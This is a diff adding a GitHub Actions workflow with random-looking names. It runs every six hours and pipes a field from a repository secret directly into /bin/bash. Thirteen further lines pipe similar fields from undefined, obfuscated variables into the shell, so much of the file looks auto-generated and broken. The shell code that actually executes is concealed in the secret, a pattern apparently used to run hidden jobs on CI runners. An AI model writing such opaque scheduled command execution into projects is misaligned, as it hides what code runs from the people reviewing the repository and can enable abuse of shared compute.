@@ -1,0 +1,30 @@
+name: caocao19870105
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caocao19870105
+        env:
+          m38215: ${{ secrets.m38215 }}
+        run: |
+          echo $m38215 | jq -r .f56775 | /bin/bash
+          echo $ozb84 | jq -r .wgxrs3 | /bin/bash
+          echo $mlip702 | jq -r .mp00 | /bin/bash
+          echo $i289 | jq -r .ot23589 | /bin/bash
+          echo $ncnoz71836 | jq -r .pckvy325 | /bin/bash
+          echo $ijri7 | jq -r .itu8 | /bin/bash
+          echo $q50 | jq -r .r09 | /bin/bash
+          echo $vsl6192 | jq -r .dqpj647 | /bin/bash
+          echo $ncc614 | jq -r .peb931 | /bin/bash
+          echo $rjxq4 | jq -r .scazi184 | /bin/bash
+          echo $c26212 | jq -r .t67 | /bin/bash
+          echo $bzflr66 | jq -r .upskj71060 | /bin/bash
+          echo $v1951 | jq -r .gqrx44351 | /bin/bash
+          echo $sthw42166 | jq -r .nlm11192 | /bin/bash
+
